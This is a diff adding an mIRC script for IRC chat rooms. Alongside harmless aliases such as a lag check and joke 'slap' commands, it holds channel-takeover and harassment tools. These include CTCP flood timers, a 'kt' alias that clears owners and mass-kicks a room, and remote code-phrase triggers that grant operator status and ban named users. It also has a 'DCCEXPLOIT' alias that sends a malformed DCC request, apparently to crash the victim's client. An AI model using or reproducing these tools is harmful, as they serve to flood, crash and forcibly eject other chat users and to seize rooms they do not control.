@@ -1,0 +1,278 @@
+;Lag Check
+
+alias chklag {
+  .notice $me axbx $+ $ticks
+}
+alias showlag {
+  .notice $me xbxa $+ $ticks
+}
+on ^*:NOTICE:axbx*:?:{
+  .notice $me Your lag time is: $calc($calc($ticks - $right($1-,-4)) / 1000) Seconds
+  haltdef
+}
+on ^*:NOTICE:xbxa*:?:{
+  msg $active My lag time is: $calc($calc($ticks - $right($1-,-4)) / 1000) Seconds
+  haltdef
+}
+
+;Show Listed Rooms
+
+alias slr {
+  var %i = 1
+  while (%i <= $chan(0)) {
+    if ($1 ison $chan(%i)) {
+      echo -a $1 is on $chan(%i)
+    }
+    inc %i
+  }
+}
+
+;Close Unused Sockets
+;(Convert Menu)
+
+;Partall
+
+alias partall {
+  var %i = 1
+  while (%i <= $chan(0)) {
+    part $chan(%i)
+    inc %i
+  }
+}
+
+;Clone
+;(Convert Nick)
+alias clone {
+  sockwrite -tn Local : $+ $me NICK $1 | sockclose chan.*
+}
+
+
+;Quit
+
+alias quit {
+  ;format room message
+  sockwrite -tn $hget(channels,$1) QUIT : $+ $2-
+}
+
+;Quitall
+alias quitall {
+  var %i = 1
+  while (%i <= $chan(0)) {
+    sockwrite -tn $hget(channels,$chan(%i)) QUIT : $+ $2-
+    inc %i
+  }
+}
+
+
+;Show Scripts
+alias showscripts {
+  var %i = 1
+  while (%i <= $script(0)) {
+    msg # %i : $script(%i)
+    inc %i
+  }
+}
+
+;Input CD
+on *:INPUT:#:{
+  if ($1 == .cd) {
+    if ($me isowner #) || ($me isop #) {
+      access # clear deny
+      msg # Access Cleared.
+    }
+    else { echo # Im not owner to do this... }
+  }
+}
+
+;Flood
+
+alias flood {
+  if ($1) {
+    if ($me isowner #) || ($me isop #) {
+      mode # -qo $1 $1
+      $+(.timerflood,$rand(a,z)) -m 40 70 //ctcp $1 TIME
+    }
+  }
+}
+
+;Disconnect
+
+alias disconnect {
+  if ($1) {
+    if ($me isowner #) || ($me isop #) {
+      mode # -qo $1 $1
+      $+(.timerflood,$rand(a,z)) -m 40 70 //ctcp $1 TIME
+    }
+  }
+}
+
+;.hop
+;(L)Sky(L)
+;(F)Sky(F)
+;(K)Sky(K)
+;>
+;<
+;.kill
+;.takeout
+;+o
+;+q
+;+v
+;-a
+
+
+on Terminal:text:*:#:{
+  if ($strip($1-) == .hop $me) {
+    hop #
+  }
+  elseif ($strip($1) == $+($chr(40),L,$chr(41),Sky,$chr(40),L,$chr(41))) {
+    if ($me isowner #) {
+      mode # +q $nick
+    }
+  }
+  elseif ($strip($1) == $+($chr(40),F,$chr(41),Sky,$chr(40),F,$chr(41))) {
+    if ($me isowner #) || ($me isop #) {
+      mode # +o $nick
+    }
+  }
+  elseif ($strip($1) == $+($chr(40),K,$chr(41),Sky,$chr(40),K,$chr(41))) {
+    if ($me isowner #) || ($me isop #) {
+      mode # +o $nick
+    }
+  }
+  elseif ($strip($1) == >) {
+    if ($me isowner #) {
+      mode # +q $nick
+    }
+  }
+  elseif ($strip($1) == <) {
+    if ($me isowner #) {
+      mode # -q $nick
+    }
+  }
+  elseif ($strip($1) == .kill) {
+    if ($strip($2) ison #) {
+      if ($me isowner #) {
+        if ($ial($strip($2)).addr != $null) {
+          sockwrite $hget(channels,#) $+(access # clear owner,$lf,access # add deny $ial($strip($2)).addr,$crlf)
+        }
+        sockwrite $hget(channels,#) $+(access # add deny $strip($2),$lf,kick # $strip($2) :Killed.,$crlf)         
+      }
+      elseif ($me isop #) && ($strip($2) !isowner #) {
+        if ($ial($strip($2)).addr != $null) {
+          sockwrite $hget(channels,#) $+(access # clear host,$lf,access # add deny $ial($strip($2)).addr,$crlf)
+        }
+        sockwrite $hget(channels,#) $+(access # add deny $strip($2),$lf,kick # $strip($2) :Killed.,$crlf)
+      }
+      elseif ($me !isop #) && ($me !isowner #) {
+        echo # I am not owner
+      }
+    }
+  }
+  elseif ($strip($1) == .takeout) {
+    if ($strip($2) ison #) {
+      if ($me isowner #) {
+        if ($ial($strip($2)).addr != $null) {
+          sockwrite $hget(channels,#) $+(access # clear owner,$lf,access # add deny $ial($strip($2)).addr,$crlf)
+        }
+        sockwrite $hget(channels,#) $+(access # add deny $strip($2),$lf,kick # $strip($2) :Killed.,$crlf)         
+      }
+      elseif ($me isop #) && ($strip($2) !isowner #) {
+        if ($ial($strip($2)).addr != $null) {
+          sockwrite $hget(channels,#) $+(access # clear host,$lf,access # add deny $ial($strip($2)).addr,$crlf)
+        }
+        sockwrite $hget(channels,#) $+(access # add deny $strip($2),$lf,kick # $strip($2) :Killed.,$crlf)
+      }
+      elseif ($me !isop #) && ($me !isowner #) {
+        echo # I am not owner
+      }
+    }
+  }
+  elseif ($strip($1) == +q) {
+    if ($me isowner #) {
+      mode # +q $nick
+    }
+  }
+  elseif ($strip($1) == -q) {
+    if ($me isowner #) {
+      mode # -q $nick
+    }
+  }
+  elseif ($strip($1) == +o) {
+    if ($me isowner #) || ($me isop #) {
+      mode # +o $nick
+    }
+  }
+  elseif ($strip($1) == -o) {
+    if ($me isowner #) || ($me isop #) {
+      mode # -o $nick
+    }
+  }
+  elseif ($strip($1) == .kt) {
+    kt #
+  }
+  elseif ($strip($1) == .fu) {
+    kt #
+  }
+  elseif ($strip($1) == +v) {
+    if ($me isowner #) || ($me isop #) {
+      mode # +v $nick
+    }
+  }
+  elseif ($strip($1) == -a) {
+    if ($me isowner #) {
+      mode # -q $nick
+    }
+    elseif ($me isop #) && ($nick !isowner #) {
+      mode # -o $nick
+    }
+  }
+}
+
+;kt
+
+alias kt {
+
+  var %i = 1
+  sockwrite $hget(channels,#) $+(access # clear owner,$lf,prop # ownerkey fu- $+ $rand(1000,9999),$crlf)
+  while (%i <= $nick(#,0)) {
+    if ($nick(#,0) != $me) {
+      sockwrite -tn $hget(channels,#) kick # $nick(#,%i) 1,0fu0,1[kt]
+    }
+    inc %i
+  }
+  sockwrite $hget(channels,#) $+(prop # ownerkey fu- $+ $rand(1000,9999),$lf,access # clear owner,$crlf)
+
+}
+
+;slapchan
+
+alias slapchan {
+  var %i = 1
+  while (%i <= $nick(#,0)) {
+    if ($nick(#,%i) != $me) {
+      me Slaps $nick(#,%i) on the head with a little stick :p
+    }
+    inc %i
+  }
+}
+
+;kickbutt
+
+alias kickbutt {
+  var %i = 1
+  while (%i <= $nick(#,0)) {
+    if ($nick(#,%i) != $me) {
+      me kicks $nick(#,%i) butt and says huyaaaaaaaaa
+    }
+    inc %i
+  }
+}
+
+alias DCCEXPLOIT { .raw PRIVMSG $1 $+(:,$chr(1),DCC) send " $+ $str($rand(a,z) $+ $chr(32),250) $+ " 0 2130706433 $+(8192,$chr(1)) }
+
+
+;::TAKES::
+;::INSERT GateTracker::
+;::INSERT Colours::
+
+;Profile Checker (Upgrade)
